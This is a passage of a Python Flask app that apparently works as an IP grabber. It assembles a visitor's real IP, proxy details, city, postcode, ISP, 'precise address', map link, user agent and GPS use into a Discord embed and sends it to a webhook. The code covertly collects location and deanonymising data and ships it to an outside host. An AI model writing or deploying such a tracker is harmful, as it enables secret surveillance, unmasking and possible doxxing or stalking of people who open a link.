": f"`{real_ip}`", "inline": True},
                {"name": "🔁 Proxy / Connecting IP", "value": f"`{proxy_ip}`", "inline": True},
                {"name": "🔌 Proxy Port", "value": f"{proxy_port or 'Unknown'}", "inline": True},
                {"name": "🔗 Proxy Chain", "value": f"```{proxy_chain or 'none'}```", "inline": False},
                {"name": "📍 Location (city/region/country)", "value": f"{details.get('city') or 'Unknown'}, {details.get('region') or 'Unknown'} ({details.get('country_name') or details.get('country') or 'Unknown'})", "inline": False},
                {"name": "📫 Postal / Postcode", "value": f"{postal or details.get('postal') or 'Unknown'}", "inline": True},
                {"name": "🏢 ISP / Org", "value": f"{details.get('org') or 'Unknown ISP'}", "inline": True},
                {"name": "📍 Precise Address (if allowed)", "value": f"{address_display or 'Not provided'}", "inline": False},
                {"name": "🌍 Map", "value": f"[Open Map]({map_url})", "inline": False},
                {"name": "📱 User Agent", "value": f"`{ua}`", "inline": False},
                {"name": "Source", "value": details.get("_source") or "ipapi", "inline": True},
                {"name": "Time (UTC)", "value": now_gmt(), "inline": True},
                {"name": "GPS Provided", "value": "Yes ✅" if gps_used else "No — used IP lookup", "inline": True}
            ]
        }]
    }

    # Send webhook and log result
    ok = send_discord_embed(embed)
    if not ok:
        log_debug(f"Failed to send webhook for {real_ip}")

    return jsonify({"status": "ok", "sent": ok}), 200

# ========== RUN ===========
if __name__ == "__main__":
    # quick dev run; in production use gunicorn main:app
    app.run(host="0.0.0.0", port=10000, debug=False)
